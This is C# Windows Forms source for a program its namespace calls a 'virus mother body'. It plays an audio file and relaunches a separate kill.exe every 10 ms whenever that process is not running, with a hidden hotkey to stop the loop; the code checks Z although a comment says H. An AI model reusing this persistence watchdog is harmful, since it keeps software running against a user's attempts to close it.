using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace 病毒母体
{
    public partial class Form1 : Form
    {
        string bingdu;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {    
            bingdu = Application.StartupPath;

            timer1.Interval = 10;
            timer1.Start();

            this.Location = new Point(800,500);

            axWindowsMediaPlayer1.URL = bingdu + "\\1.mp3";
            axWindowsMediaPlayer1.Ctlcontrols.play();//播放文件

            if (!IsProgresStated("kill"))
            {
                Process m_program;
                m_program = new Process();
                m_program.StartInfo.FileName = bingdu + "\\kill.exe";
                m_program.Start();
            }
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!IsProgresStated("kill"))
            {
                Process m_program = null;
                m_program = new Process();
                m_program.StartInfo.FileName = bingdu + "\\kill.exe";
                m_program.Start();
            }
        }
        private bool IsProgresStated(string progressName)
        {
            Process[] temp = Process.GetProcessesByName(progressName);
            if (temp.Length > 0) return true;//打开返回true，关闭返回false
            else
                return false;
        }


         // Ctrl + Alt + Shift + H 
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
             
            if ((Control.ModifierKeys & Keys.Control) != 0 &&
                 (Control.ModifierKeys & Keys.Alt) != 0 &&
                 (Control.ModifierKeys & Keys.Shift) != 0 &&
                 e.KeyCode == Keys.Z)
            {
                timer1.Stop();
            }  
        }


    }

}
